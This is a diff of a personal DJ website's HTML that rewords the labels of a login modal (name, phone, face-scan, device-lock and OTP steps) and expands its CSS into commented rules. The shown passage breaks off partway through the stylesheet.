@@ -2710,12 +2710,11 @@
 </script>
         
         <a href="mailto:maa.nirmala.dj.beltikri@gmail.com" class="side-link"><i class="fas fa-envelope"></i> Email</a>
-        
-    </div><a href="javascript:void(0)" class="mnd-simple-trigger" onclick="mndAuth.openModal()">
+        <a href="javascript:void(0)" class="mnd-simple-trigger" onclick="mndAuth.openModal()">
     <div class="mnd-trigger-icon"><i class="fas fa-fingerprint"></i></div>
     <div class="mnd-trigger-text">
-        <strong>Access Creators Hub</strong>
-        <span>Secure Identity Gateway</span>
+        <strong>Access Secure Hub</strong>
+        <span>Encrypted Identity Gateway</span>
     </div>
     <i class="fas fa-chevron-right mnd-trigger-arrow"></i>
 </a>
@@ -2723,7 +2722,7 @@
 <div id="mndToast" class="mnd-toast mnd-hidden" onclick="mndAuth.copyOTP()">
     <div class="mnd-toast-icon"><img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="MND Logo"></div>
     <div class="mnd-toast-content">
-        <strong>Maa Nirmala DJ Security</strong>
+        <strong>MND Security Alert</strong>
         <span class="mnd-toast-desc" id="toastDesc">Your verification code is ready. Tap to copy.</span>
     </div>
     <div class="mnd-toast-code" id="toastCode">******</div>
@@ -2733,17 +2732,16 @@
     <div class="mnd-modal-fullscreen">
         
         <div class="mnd-modal-header">
-            <div class="mnd-drag-indicator"></div>
             <button class="mnd-close-btn" onclick="mndAuth.abortProcess()"><i class="fas fa-times"></i></button>
-            <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="mnd-header-logo">
-            <h2 class="mnd-header-title">MFA VERIFICATION</h2>
-            <p class="mnd-header-sub">End-to-End Encrypted</p>
+            <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="mnd-header-logo" alt="Logo">
+            <h2 class="mnd-header-title">MFA SECURE LOGIN</h2>
+            <p class="mnd-header-sub">Enterprise Grade Encryption</p>
         </div>
 
         <div class="mnd-scroll-body">
             
             <div id="step1" class="mnd-step active">
-                <p class="mnd-instruction">Enter your details to initiate a secure session.</p>
+                <p class="mnd-instruction">Enter your identity matrix to initiate a secure session.</p>
                 
                 <div class="mnd-input-wrap">
                     <i class="fas fa-user"></i>
@@ -2755,19 +2753,19 @@
                 </div>
                 <div class="mnd-input-wrap">
                     <i class="fas fa-phone"></i>
-                    <input type="tel" id="inpPhone" class="mnd-input" placeholder="10-Digit Mobile" maxlength="10" autocomplete="tel">
+                    <input type="tel" id="inpPhone" class="mnd-input" placeholder="10-Digit Mobile Number" maxlength="10" autocomplete="tel">
                 </div>
 
                 <div class="mnd-divider"><span>SELECT LOGIN METHOD</span></div>
 
                 <button class="mnd-btn btn-gold" onclick="mndFace.startScan()">
-                    <i class="fas fa-camera"></i> Face Verification
+                    <i class="fas fa-camera"></i> VERIFY VIA FACE SCAN
                 </button>
                 <button class="mnd-btn btn-dark" onclick="mndSecurity.startBiometric()">
-                    <i class="fas fa-fingerprint"></i> Device Lock / Fingerprint
+                    <i class="fas fa-fingerprint"></i> USE DEVICE LOCK
                 </button>
-                <button class="mnd-btn btn-outline" id="btnSms" onclick="mndAuth.generateOTP('Standard SMS')">
-                    <i class="fas fa-comment-sms"></i> Login with OTP
+                <button class="mnd-btn btn-outline" id="btnSms" onclick="mndAuth.generateOTP('Standard SMS OTP')">
+                    <i class="fas fa-comment-sms"></i> LOGIN WITH OTP
                 </button>
             </div>
 
@@ -2775,19 +2773,20 @@
                 <h3 class="mnd-step-title">HUMAN VERIFICATION</h3>
                 
                 <div class="mnd-kyc-hints" id="kycHints">
-                    <i class="fas fa-info-circle"></i> <span id="kycHintText">Look straight into the camera</span>
+                    <i class="fas fa-info-circle"></i> <span id="kycHintText">Look straight into the camera.</span>
                 </div>
                 
                 <div class="mnd-kyc-container" id="kycBox">
                     <video id="kycVideo" autoplay muted playsinline></video>
                     <div class="mnd-kyc-ring"></div>
+                    <div class="mnd-green-laser-frame" id="greenLaser"></div>
                 </div>
                 
                 <div class="mnd-camera-controls">
-                    <button class="mnd-cam-btn" onclick="mndFace.toggleCamera()" title="Switch Front/Rear">
-                        <i class="fas fa-sync-alt"></i> Flip
+                    <button class="mnd-cam-btn" onclick="mndFace.toggleCamera()" title="Switch Front/Rear Camera">
+                        <i class="fas fa-sync-alt"></i> Flip Camera
                     </button>
-                    <button class="mnd-cam-btn" id="btnFlash" onclick="mndFace.toggleFlashlight()" style="display:none;" title="Flashlight">
+                    <button class="mnd-cam-btn" id="btnFlash" onclick="mndFace.toggleFlashlight()" style="display:none;" title="Toggle Flashlight">
                         <i class="fas fa-bolt"></i> Flash
                     </button>
                 </div>
@@ -2796,17 +2795,17 @@
                 <canvas id="kycCanvas" style="display:none;"></canvas>
 
                 <button class="mnd-btn btn-gold" id="btnStartScan" onclick="mndFace.runAnalysis()">
-                    <i class="fas fa-expand"></i> START SCANNING
+                    <i class="fas fa-expand"></i> START SECURE SCAN
                 </button>
                 <button class="mnd-btn btn-danger" onclick="mndAuth.abortProcess()">
-                    <i class="fas fa-times-circle"></i> CANCEL & GO BACK
+                    <i class="fas fa-times-circle"></i> STOP SCAN & GO BACK
                 </button>
             </div>
 
             <div id="step3" class="mnd-step">
                 <i class="fas fa-shield-check mnd-success-icon"></i>
                 <h3 class="mnd-step-title" style="color: var(--success);">SECURITY CODE SENT</h3>
-                <p class="mnd-instruction">Enter the 6-digit code below. Valid for 5 minutes.</p>
+                <p class="mnd-instruction">Enter the 6-digit code below. Valid for a limited time.</p>
 
                 <div class="mnd-otp-center-wrap">
                     <input type="tel" id="inpOTP" class="mnd-otp-input" placeholder="------" maxlength="6" autocomplete="one-time-code">
@@ -2820,10 +2819,10 @@
                 
                 <div class="mnd-btn-row">
                     <button class="mnd-btn btn-dark half-btn" id="btnResend" onclick="mndAuth.resendOTP()">
-                        <i class="fas fa-redo"></i> RESEND <span id="resendTimer"></span>
+                        <i class="fas fa-redo"></i> RESEND OTP <span id="resendTimer"></span>
                     </button>
                     <button class="mnd-btn btn-danger half-btn" onclick="mndAuth.abortProcess()">
-                        <i class="fas fa-arrow-left"></i> BACK
+                        <i class="fas fa-arrow-left"></i> GO BACK
                     </button>
                 </div>
             </div>
@@ -2839,207 +2838,788 @@
     </div>
     <div class="loader-text" id="loaderText">Initializing Secure Connection...</div>
     <div class="loader-progress-bar"><div class="loader-progress-fill" id="loaderFill"></div></div>
-    <style>
-    /* --- 1. GLOBAL VARIABLES & RESET --- */
+</div>
+<style>
+    /* * ---------------------------------------------------------------------------------------
+     * 1. GLOBAL DESIGN TOKENS & HARDWARE ACCELERATION VARIABLES
+     * ---------------------------------------------------------------------------------------
+     * These CSS variables dictate the entire thematic presence of the application. 
+     * By centralizing these values, we ensure that the "Deep UI" maintains absolute 
+     * consistency across all viewports.
+     */
     :root {
-        --primary: #D4AF37;
-        --success: #00fa9a;
-        --danger: #ff4444;
-        --bg-main: #050505;
-        --bg-panel: #111111;
-        --bg-input: #1a1a1a;
-        --border-deep: rgba(255, 255, 255, 0.12);
+        /* Primary Brand Colors */
+        --primary: #D4AF37;           /* Premium Gold for Primary Actions */
+        --primary-glow: rgba(212, 175, 55, 0.4);
+        --primary-bg: rgba(212, 175, 55, 0.05);
+        
+        /* Tactical Status Colors */
+        --success: #00fa9a;           /* True Tactical Green for Success & Lasers */
+        --success-glow: rgba(0, 250, 154, 0.6);
+        --danger: #ff4444;            /* Alert Red for Errors and Aborts */
+        --danger-glow: rgba(255, 68, 68, 0.4);
+        
+        /* Deep UI Backgrounds */
+        --bg-main: #020202;           /* Absolute Pitch Black for True Full-Screen */
+        --bg-panel: #0a0a0a;          /* Slightly elevated black for headers */
+        --bg-input: #121212;          /* Deep recessed black for input fields */
+        
+        /* Structural Elements */
+        --border-deep: rgba(255, 255, 255, 0.12); /* Subtle structural lines */
         --text-main: #ffffff;
         --text-muted: #888888;
+        
+        /* Typography & Motion */
         --font-main: 'Outfit', sans-serif;
-        --ease: 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
+        --ease-smooth: 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
+        --ease-bounce: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
     }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-    body { background-color: var(--bg-main); color: var(--text-main); font-family: var(--font-main); overflow-x: hidden; }
+    /* Absolute Reset for Mobile Precision */
+    * { 
+        margin: 0; 
+        padding: 0; 
+        box-sizing: border-box; 
+        -webkit-tap-highlight-color: transparent; /* Removes blue tap flash on Android */
+    }
+    
+    body { 
+        background-color: var(--bg-main); 
+        color: var(--text-main); 
+        font-family: var(--font-main); 
+        overflow-x: hidden; 
+        width: 100vw;
+    }
 
-    /* --- 2. MAIN TRIGGER BUTTON --- */
+    /* * ---------------------------------------------------------------------------------------
+     * 2. THE SIMPLE TRIGGER BUTTON (MEDIA/FILE STYLE)
+     * ---------------------------------------------------------------------------------------
+     * Designed to sit quietly on your page until the user is ready to authenticate.
+     */
     .mnd-simple-trigger {
-        display: flex; align-items: center; gap: 15px; 
-        background: var(--bg-panel); border: 1px solid var(--border-deep);
-        border-radius: 16px; padding: 16px 20px; width: 90%; max-width: 400px;
-        margin: 30px auto; cursor: pointer; transition: var(--ease); text-decoration: none;
-        box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        display: flex; 
+        align-items: center; 
+        gap: 15px; 
+        background: var(--bg-panel); 
+        border: 1px solid var(--border-deep);
+        border-radius: 16px; 
+        padding: 16px 20px; 
+        width: 90%; 
+        max-width: 400px;
+        margin: 30px auto; 
+        cursor: pointer; 
+        transition: var(--ease-smooth); 
+        text-decoration: none;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.8);
     }
-    .mnd-simple-trigger:active { transform: scale(0.96); border-color: var(--primary); }
-    .mnd-trigger-icon { width: 45px; height: 45px; background: rgba(212, 175, 55, 0.1); color: var(--primary); border-radius: 12px; display: flex; justify-content: center; align-items: center; font-size: 20px; }
-    .mnd-trigger-text { flex: 1; display: flex; flex-direction: column; }
-    .mnd-trigger-text strong { font-size: 16px; font-weight: 800; color: #fff; }
-    .mnd-trigger-text span { font-size: 12px; color: var(--text-muted); margin-top: 2px; }
-    .mnd-trigger-arrow { color: var(--primary); font-size: 16px; opacity: 0.8; }
+    .mnd-simple-trigger:active { 
+        transform: scale(0.96); 
+        border-color: var(--primary); 
+        background: var(--primary-bg);
+    }
+    .mnd-trigger-icon { 
+        width: 48px; 
+        height: 48px; 
+        background: var(--primary-bg); 
+        color: var(--primary); 
+        border-radius: 12px; 
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+        font-size: 22px; 
+        border: 1px solid rgba(212, 175, 55, 0.2);
+    }
+    .mnd-trigger-text { 
+        flex: 1; 
+        display: flex; 
+        flex-direction: column; 
+    }
+    .mnd-trigger-text strong { 
+        font-size: 16px; 
+        font-weight: 800; 
+        color: #fff; 
+        letter-spacing: 0.5px;
+    }
+    .mnd-trigger-text span { 
+        font-size: 12px; 
+        color: var(--text-muted); 
+        margin-top: 3px; 
+    }
+    .mnd-trigger-arrow { 
+        color: var(--primary); 
+        font-size: 16px; 
+        opacity: 0.8; 
+    }
 
-    /* --- 3. ANDROID-STYLE TOAST NOTIFICATION --- */
+    /* * ---------------------------------------------------------------------------------------
+     * 3. ANDROID-STYLE TOAST NOTIFICATION (SLEEK & COMPACT)
+     * ---------------------------------------------------------------------------------------
+     * Replaces the giant blocky push notification. This floats elegantly at the top.
+     */
     .mnd-toast { 
-        position: fixed; top: -100px; left: 50%; transform: translateX(-50%); 
-        width: 90%; max-width: 340px; background: rgba(20, 20, 20, 0.98); 
-        backdrop-filter: blur(15px); border: 1px solid var(--border-deep); 
-        border-radius: 14px; padding: 12px 15px; z-index: 999999; 
-        display: flex; align-items: center; gap: 12px; box-shadow: 0 15px 30px rgba(0,0,0,0.9);
-        transition: top 0.5s var(--ease), opacity 0.3s; opacity: 0; cursor: pointer;
+        position: fixed; 
+        top: -120px; /* Hidden state above screen */
+        left: 50%; 
+        transform: translateX(-50%); 
+        width: 90%; 
+        max-width: 360px; 
+        background: rgba(20, 20, 20, 0.98); 
+        backdrop-filter: blur(20px); 
+        -webkit-backdrop-filter: blur(20px);
+        border: 1px solid var(--border-deep); 
+        border-radius: 16px; 
+        padding: 12px 16px; 
+        z-index: 9999999999; 
+        display: flex; 
+        align-items: center; 
+        gap: 15px; 
+        box-shadow: 0 15px 40px rgba(0,0,0,0.9);
+        transition: top 0.6s var(--ease-bounce), opacity 0.3s ease; 
+        opacity: 0; 
+        cursor: pointer;
     }
-    .mnd-toast.visible { top: 20px; opacity: 1; }
-    .mnd-toast-icon { width: 35px; height: 35px; border-radius: 8px; border: 2px solid var(--primary); padding: 2px; }
-    .mnd-toast-icon img { width: 100%; height: 100%; border-radius: 4px; object-fit: cover; }
-    .mnd-toast-content { flex: 1; display: flex; flex-direction: column; }
-    .mnd-toast-content strong { color: #fff; font-size: 13px; margin-bottom: 2px; letter-spacing: 0.5px; }
-    .mnd-toast-desc { color: #aaa; font-size: 11px; }
-    .mnd-toast-code { font-size: 18px; font-weight: 900; color: var(--primary); letter-spacing: 2px; background: rgba(212,175,55,0.1); padding: 5px 10px; border-radius: 8px; }
+    .mnd-toast.visible { 
+        top: 25px; /* Drops down smoothly */
+        opacity: 1; 
+    }
+    .mnd-toast:active {
+        transform: translateX(-50%) scale(0.96);
+    }
+    .mnd-toast-icon { 
+        width: 36px; 
+        height: 36px; 
+        border-radius: 8px; 
+        border: 2px solid var(--primary); 
+        padding: 2px; 
+        box-shadow: 0 0 10px var(--primary-glow);
+    }
+    .mnd-toast-icon img { 
+        width: 100%; 
+        height: 100%; 
+        border-radius: 4px; 
+        object-fit: cover; 
+    }
+    .mnd-toast-content { 
+        flex: 1; 
+        display: flex; 
+        flex-direction: column; 
+    }
+    .mnd-toast-content strong { 
+        color: #fff; 
+        font-size: 13px; 
+        margin-bottom: 2px; 
+        letter-spacing: 0.5px; 
+    }
+    .mnd-toast-desc { 
+        color: #aaa; 
+        font-size: 11px; 
+        line-height: 1.3;
+    }
+    .mnd-toast-code { 
+        font-size: 18px; 
+        font-weight: 900; 
+        color: var(--primary); 
+        letter-spacing: 2px; 
+        background: var(--primary-bg); 
+        padding: 5px 12px; 
+        border-radius: 8px; 
+        border: 1px dashed rgba(212, 175, 55, 0.4);
+    }
 
-    /* --- 4. FULL SCREEN MODAL & LAYOUT --- */
+    /* * ---------------------------------------------------------------------------------------
+     * 4. TRUE FULL-SCREEN MODAL ARCHITECTURE
+     * ---------------------------------------------------------------------------------------
+     * This forces the modal to take up exactly 100% of the device width and height.
+     * Crucially, the internal flexbox structure stops the mobile keyboard from pushing
+     * the buttons off-screen.
+     */
     .mnd-modal-overlay {
-        position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 99999;
-        display: flex; justify-content: center; align-items: flex-end; opacity: 0; 
-        transition: opacity 0.3s ease; pointer-events: none;
+        position: fixed; 
+        inset: 0; 
+        background: var(--bg-main); /* Absolute black to cover website */
+        z-index: 99999;
+        display: flex; 
+        justify-content: center; 
+        align-items: flex-start; /* Aligns to top for full screen */
+        opacity: 0; 
+        transition: opacity 0.3s ease; 
+        pointer-events: none;
     }
-    .mnd-modal-overlay.active { opacity: 1; pointer-events: all; }
+    .mnd-modal-overlay.active { 
+        opacity: 1; 
+        pointer-events: all; 
+    }
     
     .mnd-modal-fullscreen {
-        background: var(--bg-main); width: 100%; max-width: 500px; height: 95dvh;
-        display: flex; flex-direction: column; position: relative;
-        border-top-left-radius: 24px; border-top-right-radius: 24px; border-top: 1px solid var(--border-deep);
-        transform: translateY(100%); transition: transform 0.5s var(--ease);
+        background: var(--bg-main); 
+        width: 100vw; 
+        height: 100dvh; /* Uses dynamic viewport height (fixes Safari iOS bugs) */
+        display: flex; 
+        flex-direction: column; 
+        position: relative;
+        transform: translateY(20px); 
+        transition: transform 0.5s var(--ease-smooth);
     }
-    .mnd-modal-overlay.active .mnd-modal-fullscreen { transform: translateY(0); }
+    .mnd-modal-overlay.active .mnd-modal-fullscreen { 
+        transform: translateY(0); 
+    }
 
-    /* Fixed Header */
+    /* --- Fixed Header (Remains Glued to Top) --- */
     .mnd-modal-header {
-        flex-shrink: 0; padding: 20px 20px 15px; text-align: center; border-bottom: 1px solid var(--border-deep);
-        background: var(--bg-panel); border-top-left-radius: 24px; border-top-right-radius: 24px;
-        position: relative; display: flex; flex-direction: column; align-items: center;
+        flex-shrink: 0; /* Prevents header from collapsing */
+        padding: 25px 20px 15px; 
+        text-align: center; 
+        border-bottom: 1px solid var(--border-deep);
+        background: var(--bg-panel); 
+        position: relative; 
+        display: flex; 
+        flex-direction: column; 
+        align-items: center;
+        box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+        z-index: 10;
     }
-    .mnd-drag-indicator { width: 40px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 4px; margin-bottom: 15px; }
-    .mnd-close-btn { position: absolute; top: 20px; right: 20px; width: 32px; height: 32px; border-radius: 50%; background: var(--bg-input); color: var(--text-muted); display: flex; justify-content: center; align-items: center; font-size: 14px; cursor: pointer; border: 1px solid var(--border-deep); transition: 0.2s; }
-    .mnd-close-btn:active { transform: scale(0.9); background: rgba(255,68,68,0.2); color: var(--danger); }
-    .mnd-header-logo { width: 55px; height: 55px; border-radius: 50%; border: 2px solid var(--primary); margin-bottom: 10px; object-fit: cover; }
-    .mnd-header-title { font-size: 18px; font-weight: 900; letter-spacing: 1px; color: #fff; }
-    .mnd-header-sub { font-size: 10px; color: var(--success); font-weight: 700; letter-spacing: 2px; text-transform: uppercase; margin-top: 4px; }
+    .mnd-close-btn { 
+        position: absolute; 
+        top: 25px; 
+        right: 25px; 
+        width: 36px; 
+        height: 36px; 
+        border-radius: 50%; 
+        background: var(--bg-input); 
+        color: var(--text-muted); 
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+        font-size: 16px; 
+        cursor: pointer; 
+        border: 1px solid var(--border-deep); 
+        transition: 0.2s; 
+    }
+    .mnd-close-btn:active { 
+        transform: scale(0.85); 
+        background: rgba(255, 68, 68, 0.2); 
+        color: var(--danger); 
+        border-color: var(--danger);
+    }
+    .mnd-header-logo { 
+        width: 60px; 
+        height: 60px; 
+        border-radius: 50%; 
+        border: 2px solid var(--primary); 
+        margin-bottom: 10px; 
+        object-fit: cover; 
+        box-shadow: 0 0 15px var(--primary-glow);
+    }
+    .mnd-header-title { 
+        font-size: 18px; 
+        font-weight: 900; 
+        letter-spacing: 1.5px; 
+        color: #fff; 
+    }
+    .mnd-header-sub { 
+        font-size: 10px; 
+        color: var(--success); 
+        font-weight: 700; 
+        letter-spacing: 2px; 
+        text-transform: uppercase; 
+        margin-top: 5px; 
+        animation: pulseText 2s infinite;
+    }
 
-    /* Scrollable Content */
-    .mnd-scroll-body { flex: 1; overflow-y: auto; padding: 25px 20px; -webkit-overflow-scrolling: touch; }
-    .mnd-step { display: none; flex-direction: column; animation: slideFadeIn 0.4s var(--ease) forwards; max-width: 400px; margin: 0 auto; width: 100%; }
+    /* --- Scrollable Content Body (The Keyboard Fix) --- */
+    .mnd-scroll-body { 
+        flex: 1; /* Takes up all remaining space below header */
+        overflow-y: auto; 
+        padding: 30px 20px; 
+        -webkit-overflow-scrolling: touch; /* Butter-smooth iOS scrolling */
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+    .mnd-step { 
+        display: none; 
+        flex-direction: column; 
+        animation: slideFadeIn 0.4s var(--ease-smooth) forwards; 
+        width: 100%;
+        max-width: 400px; /* Constrains width on tablets */
+    }
     .mnd-step.active { display: flex; }
-    .mnd-instruction { text-align: center; color: var(--text-muted); font-size: 13px; margin-bottom: 25px; line-height: 1.5; }
+    .mnd-instruction { 
+        text-align: center; 
+        color: var(--text-muted); 
+        font-size: 13px; 
+        margin-bottom: 25px; 
+        line-height: 1.6; 
+    }
 
-    /* --- 5. INPUTS & BUTTONS --- */
-    .mnd-input-wrap { position: relative; margin-bottom: 15px; }
-    .mnd-input-wrap i { position: absolute; left: 18px; top: 18px; color: var(--primary); font-size: 15px; opacity: 0.8; }
+    /* * ---------------------------------------------------------------------------------------
+     * 5. DEEP UI INPUTS & BUTTONS
+     * ---------------------------------------------------------------------------------------
+     */
+    .mnd-input-wrap { 
+        position: relative; 
+        margin-bottom: 16px; 
+        width: 100%;
+    }
+    .mnd-input-wrap i { 
+        position: absolute; 
+        left: 20px; 
+        top: 20px; 
+        color: var(--primary); 
+        font-size: 16px; 
+        opacity: 0.8; 
+        transition: 0.3s;
+    }
     .mnd-input {
-        width: 100%; padding: 16px 16px 16px 50px; background: var(--bg-input);
-        border: 1px solid var(--border-deep); border-radius: 12px; color: #fff;
-        font-family: var(--font-main); font-size: 15px; font-weight: 500;
-        transition: 0.3s ease; outline: none; -webkit-appearance: none;
+        width: 100%; 
+        padding: 18px 20px 18px 55px; 
+        background: var(--bg-input);
+        border: 2px solid var(--border-deep); 
+        border-radius: 14px; 
+        color: #fff;
+        font-family: var(--font-main); 
+        font-size: 15px; 
+        font-weight: 500;
+        transition: 0.3s ease; 
+        outline: none; 
+        -webkit-appearance: none;
+        box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
     }
-    .mnd-input:focus { border-color: var(--primary); background: rgba(212,175,55,0.05); box-shadow: inset 0 0 10px rgba(0,0,0,0.5); }
+    .mnd-input:focus { 
+        border-color: var(--primary); 
+        background: #181818; 
+        box-shadow: inset 0 0 15px var(--primary-bg), 0 0 10px var(--primary-glow); 
+    }
+    .mnd-input:focus + i, .mnd-input-wrap:focus-within i {
+        color: #fff;
+        opacity: 1;
+        text-shadow: 0 0 10px var(--primary);
+    }
     
-    .mnd-divider { display: flex; align-items: center; margin: 25px 0; }
-    .mnd-divider::before, .mnd-divider::after { content: ''; flex: 1; height: 1px; background: var(--border-deep); }
-    .mnd-divider span { padding: 0 15px; font-size: 11px; font-weight: 800; color: #666; letter-spacing: 1.5px; text-transform: uppercase; }
+    .mnd-divider { 
+        display: flex; 
+        align-items: center; 
+        margin: 25px 0; 
+        width: 100%;
+    }
+    .mnd-divider::before, .mnd-divider::after { 
+        content: ''; 
+        flex: 1; 
+        height: 1px; 
+        background: var(--border-deep); 
+    }
+    .mnd-divider span { 
+        padding: 0 15px; 
+        font-size: 11px; 
+        font-weight: 800; 
+        color: #666; 
+        letter-spacing: 2px; 
+        text-transform: uppercase; 
+    }
 
+    /* Modular Button System */
     .mnd-btn {
-        width: 100%; padding: 16px; border-radius: 12px; font-family: var(--font-main);
-        font-weight: 800; font-size: 14px; border: none; cursor: pointer; letter-spacing: 0.5px;
-        display: flex; justify-content: center; align-items: center; gap: 10px;
-        transition: transform 0.2s, background 0.3s; margin-bottom: 12px;
+        width: 100%; 
+        padding: 18px; 
+        border-radius: 14px; 
+        font-family: var(--font-main);
+        font-weight: 800; 
+        font-size: 14px; 
+        border: none; 
+        cursor: pointer; 
+        letter-spacing: 0.5px;
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+        gap: 12px;
+        transition: transform 0.2s cubic-bezier(0.4, 0, 0.2, 1), box-shadow 0.2s, background 0.3s; 
+        margin-bottom: 14px;
+        position: relative;
+        overflow: hidden;
     }
-    .mnd-btn:active { transform: scale(0.97); }
+    .mnd-btn:active { transform: scale(0.96); }
+    .mnd-btn i { font-size: 16px; }
     
-    .btn-gold { background: var(--primary); color: #000; box-shadow: 0 5px 15px rgba(212,175,55,0.2); }
-    .btn-dark { background: var(--bg-input); border: 1px solid var(--border-deep); color: #fff; }
+    .btn-gold { 
+        background: linear-gradient(135deg, #D4AF37 0%, #b5952f 100%); 
+        color: #000; 
+        box-shadow: 0 8px 20px var(--primary-glow); 
+    }
+    .btn-gold:hover { box-shadow: 0 10px 25px rgba(212,175,55,0.6); }
+    
+    .btn-dark { 
+        background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%); 
+        border: 1px solid var(--border-deep); 
+        color: #fff; 
+        box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+    }
     .btn-dark i { color: var(--primary); }
-    .btn-outline { background: transparent; border: 1px dashed rgba(255,255,255,0.2); color: #aaa; }
-    .btn-success { background: var(--success); color: #000; box-shadow: 0 5px 15px rgba(0,250,154,0.2); margin-top: 10px; }
-    .btn-danger { background: rgba(255,68,68,0.1); border: 1px solid rgba(255,68,68,0.3); color: var(--danger); margin-top: 5px; }
-
-    .mnd-btn-row { display: flex; gap: 10px; margin-top: 5px; }
-    .half-btn { flex: 1; padding: 15px; font-size: 12px; margin-bottom: 0; }
-
-    /* --- 6. FACE VERIFICATION UI --- */
-    .mnd-step-title { text-align: center; font-size: 16px; font-weight: 800; color: #fff; margin-bottom: 5px; letter-spacing: 1px; }
+    .btn-dark:hover { border-color: rgba(255,255,255,0.3); }
     
-    .mnd-kyc-hints { background: rgba(212, 175, 55, 0.1); border: 1px solid rgba(212, 175, 55, 0.3); color: var(--primary); padding: 10px; border-radius: 8px; font-size: 12px; text-align: center; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; gap: 8px; font-weight: 600; }
+    .btn-outline { 
+        background: transparent; 
+        border: 2px dashed rgba(255,255,255,0.2); 
+        color: #aaa; 
+    }
+    .btn-outline:hover { background: rgba(255,255,255,0.05); color: #fff; }
+    
+    .btn-success { 
+        background: linear-gradient(135deg, var(--success) 0%, #00cc7a 100%); 
+        color: #000; 
+        box-shadow: 0 8px 20px var(--success-glow); 
+        margin-top: 10px; 
+    }
+    
+    .btn-danger { 
+        background: rgba(255,68,68,0.1); 
+        border: 1px solid rgba(255,68,68,0.4); 
+        color: var(--danger); 
+        margin-top: 5px; 
+    }
+    .btn-danger:hover { background: rgba(255,68,68,0.2); }
+
+    /* Dual Button Row (For Resend & Go Back) */
+    .mnd-btn-row { 
+        display: flex; 
+        gap: 12px; 
+        margin-top: 5px; 
+        width: 100%;
+    }
+    .half-btn { 
+        flex: 1; 
+        padding: 16px 10px; 
+        font-size: 12px; 
+        margin-bottom: 0; 
+    }
+
+    /* * ---------------------------------------------------------------------------------------
+     * 6. STRICT FACE VERIFICATION & THE PERFECT GREEN LASER
+     * ---------------------------------------------------------------------------------------
+     * This defines the YouTube/Instagram style Oval, and creates the highly requested
+     * flawless green laser scanning animation.
+     */
+    .mnd-step-title { 
+        text-align: center; 
+        font-size: 16px; 
+        font-weight: 900; 
+        color: #fff; 
+        margin-bottom: 10px; 
+        letter-spacing: 1.5px; 
+    }
+    
+    .mnd-kyc-hints { 
+        background: rgba(212, 175, 55, 0.08); 
+        border: 1px solid rgba(212, 175, 55, 0.3); 
+        color: var(--primary); 
+        padding: 12px; 
+        border-radius: 10px; 
+        font-size: 12px; 
+        text-align: center; 
+        margin-bottom: 20px; 
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+        gap: 10px; 
+        font-weight: 700; 
+    }
     
     .mnd-kyc-container {
-        width: 220px; height: 300px; margin: 10px auto 15px; position: relative;
-        border-radius: 110px; /* Perfect Oval */
-        overflow: hidden; border: 4px solid var(--bg-input);
-        background: #111; display: flex; justify-content: center; align-items: center;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+        width: 240px; 
+        height: 320px; 
+        margin: 10px auto 20px; 
+        position: relative;
+        border-radius: 150px; /* Creates the perfect oval mask */
+        overflow: hidden; 
+        border: 5px solid var(--bg-input);
+        background: #111; 
+        display: flex; 
+        justify-content: center; 
+        align-items: center;
+        box-shadow: 0 15px 40px rgba(0,0,0,0.9), inset 0 0 20px rgba(0,0,0,0.8);
+        transform: translateZ(0); /* Forces GPU rendering for smooth video */
     }
-    #kycVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-    .mnd-kyc-ring {
-        position: absolute; inset: -4px; border-radius: 110px;
-        border: 4px solid transparent; transition: 0.4s; z-index: 5; pointer-events: none;
-    }
-    .scanner-active .mnd-kyc-ring { border-color: var(--primary); animation: pulseOval 1.5s infinite; }
-    .scanner-success .mnd-kyc-ring { border-color: var(--success); box-shadow: inset 0 0 30px rgba(0,250,154,0.5); }
-    .scanner-error .mnd-kyc-ring { border-color: var(--danger); box-shadow: inset 0 0 30px rgba(255,68,68,0.5); }
-
-    .mnd-camera-controls { display: flex; justify-content: center; gap: 15px; margin-bottom: 15px; }
-    .mnd-cam-btn { background: rgba(255,255,255,0.1); border: none; color: #fff; padding: 8px 15px; border-radius: 20px; font-size: 12px; cursor: pointer; display: flex; align-items: center; gap: 6px; }
     
-    .mnd-kyc-status { font-size: 12px; font-weight: 800; text-align: center; margin-bottom: 20px; color: var(--text-muted); letter-spacing: 1px; }
-
-    /* --- 7. PERFECT CENTERED OTP INPUT --- */
-    .mnd-success-icon { font-size: 45px; color: var(--success); text-align: center; display: block; margin-bottom: 10px; }
-    .mnd-otp-center-wrap { display: flex; justify-content: center; margin-bottom: 5px; }
-    .mnd-otp-input {
-        width: 220px; padding: 15px 10px; background: var(--bg-input);
-        border: 2px solid var(--primary); border-radius: 12px; color: var(--primary);
-        font-family: var(--font-main); text-align: center; font-size: 28px;
-        letter-spacing: 10px; font-weight: 900; outline: none;
-        box-shadow: inset 0 0 15px rgba(0,0,0,0.8); -webkit-appearance: none;
+    #kycVideo { 
+        width: 100%; 
+        height: 100%; 
+        object-fit: cover; 
+        transform: scaleX(-1); /* Mirrors the camera correctly */
+        filter: contrast(1.1) brightness(1.1); /* Minor enhancement for better AI reading */
     }
-    .mnd-otp-input:focus { border-color: #fff; color: #fff; }
-    .mnd-error-text { color: var(--danger); font-size: 12px; text-align: center; height: 15px; margin-bottom: 15px; font-weight: 600; }
+    
+    /* The Oval Glow Ring */
